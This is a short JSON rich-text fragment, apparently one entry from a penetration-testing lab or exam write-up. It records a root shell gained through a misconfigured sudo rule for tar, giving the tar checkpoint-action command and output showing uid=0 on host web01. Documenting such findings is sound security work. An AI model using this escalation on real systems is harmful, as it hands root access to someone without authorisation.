{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-web01-tar:title","gen":"1137f079"},"content":[{"type":"text","text":"Root shell through sudo tar:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-tar:0:command","gen":"58f66545"},"content":[{"type":"text","text":"sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-tar:0:output","gen":"b2b206ed"},"content":[{"type":"text","text":"/usr/bin/tar: Removing leading \`/' from member names\\nroot@web01:/home/dev# id\\nuid=0(root) gid=0(root) groups=0(root)"}]}]}
